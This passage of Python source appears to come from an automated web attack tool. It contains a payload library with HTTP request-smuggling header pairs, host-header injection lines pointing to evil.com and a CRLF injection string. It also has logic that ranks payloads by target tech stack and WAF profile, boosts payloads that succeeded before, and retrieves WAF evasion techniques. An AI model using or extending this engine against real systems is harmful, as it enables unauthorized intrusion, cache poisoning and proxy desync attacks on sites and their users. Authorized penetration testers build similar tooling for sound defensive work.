            self._p("hs01", "Transfer-Encoding: chunked\r\nContent-Length: 4", "http_smuggling", ["header", "proxy"], 0.6, 0.55, "critical", "desync"),
            self._p("hs02", "Transfer-Encoding: chunked\r\nTransfer-encoding: x", "http_smuggling", ["header", "proxy"], 0.65, 0.6, "critical", "desync"),
        ]

    def _header_injection(self) -> List[Dict]:
        return [
            self._p("hi01", "Host: evil.com", "header_injection", ["header", "host_header"], 0.5, 0.5, "high", "host_override"),
            self._p("hi02", "X-Forwarded-Host: evil.com", "header_injection", ["header"], 0.55, 0.55, "high", "host_override"),
            self._p("hi03", "%0d%0aX-Injected: true", "header_injection", ["url_param", "header"], 0.65, 0.7, "high", "crlf_injection"),
        ]

    def get_total_count(self) -> int:
        return sum(len(v) for v in self.payloads.values())

    def get_payloads_for_context(self, tech_stack: List[str], page_context: List[str],
                                  waf_type: str = "unknown", waf_strength: str = "unknown",
                                  findings: Optional[List[Dict]] = None) -> List[Dict]:
        candidates = []
        relevant_categories = set()

        for stack in tech_stack:
            stack_lower = stack.lower()
            for tech_key, cats in self.context_matrix.items():
                if tech_key in stack_lower or stack_lower in tech_key:
                    relevant_categories.update(cats)

        if not relevant_categories:
            relevant_categories = {
                "xss_reflected", "xss_dom", "xss_polyglot", "xss_waf_bypass",
                "sqli_raw", "sqli_blind", "ssrf", "ssti_jinja", "lfi",
                "nosql_injection", "open_redirect", "path_traversal",
                "command_injection", "auth_bypass",
            }

        waf_profile = self.waf_profiles.get(waf_type.lower(), self.waf_profiles["unknown"])
        bypass_mult = waf_profile["bypass_multiplier"]

        for category, payloads in self.payloads.items():
            category_match = category in relevant_categories
            for p in payloads:
                weight = p["base_weight"]

                if category_match:
                    weight *= 1.5

                context_overlap = set(p["context"]) & set(page_context)
                if context_overlap:
                    weight *= (1.0 + 0.15 * len(context_overlap))

                weight *= bypass_mult

                if p["success_count"] > 0:
                    success_rate = p["success_count"] / max(1, p["success_count"] + p["fail_count"])
                    weight *= (1.0 + success_rate)

                if findings:
                    finding_types = set()
                    for f in findings:
                        if isinstance(f, dict):
                            finding_types.add((f.get("type", "") + " " + f.get("title", "")).lower())
                    for ft in finding_types:
                        if category.split("_")[0] in ft:
                            weight *= 1.2

                if waf_strength == "strong" and p["stealth_level"] < 0.5:
                    weight *= 0.5
                elif waf_strength == "none" and p["stealth_level"] < 0.5:
                    weight *= 1.3

                candidates.append({
                    **p,
                    "adjusted_weight": round(min(weight, 5.0), 4),
                    "category_match": category_match,
                    "context_match": len(context_overlap) if context_overlap else 0,
                })

        candidates.sort(key=lambda x: x["adjusted_weight"], reverse=True)
        return candidates

    def get_top_payloads(self, tech_stack: List[str], page_context: List[str],
                         waf_type: str = "unknown", waf_strength: str = "unknown",
                         findings: Optional[List[Dict]] = None,
                         limit: int = 25, vector_filter: Optional[str] = None) -> List[Dict]:
        all_candidates = self.get_payloads_for_context(
            tech_stack, page_context, waf_type, waf_strength, findings
        )
        if vector_filter:
            all_candidates = [c for c in all_candidates if vector_filter in c["category"]]
        return all_candidates[:limit]

    def update_weight(self, payload_id: str, success: bool):
        for payloads in self.payloads.values():
            for p in payloads:
                if p["id"] == payload_id:
                    if success:
                        p["success_count"] += 1
                        p["base_weight"] = min(1.0, p["base_weight"] + 0.05)
                    else:
                        p["fail_count"] += 1
                        p["base_weight"] = max(0.1, p["base_weight"] - 0.02)
                    return True
        return False

    def get_evasion_techniques(self, waf_type: str) -> List[str]:
        profile = self.waf_profiles.get(waf_type.lower(), self.waf_profiles["unknown"])
        return profile.get("techniques", [])

    def generate_report(self) -> Dict:
        total = self.get_total_count()
        by_category = {k: len(v) for k, v in self.payloads.items()}
        top_success = []
        for payloads in self.payloads.values():
            for p in payloads:
                if p["success_count"] > 0:
                    top_success.append({"id": p["id"], "payload": p["payload"][:80], "success": p["success_count"], "fail": p["fail_count"]})
        top_success.sort(key=lambda x: x["success"], reverse=True)
        return {
            "total_payloads": total,
            "categories": len(self.payloads),
            "by_category": by_category,
            "tech_stacks_mapped": len(self.context_matrix),
            "waf_profiles": len(self.waf_profiles),
            "top_successful": top_success[:10],
            "execution_history_count": len(self.execution_history),
        }
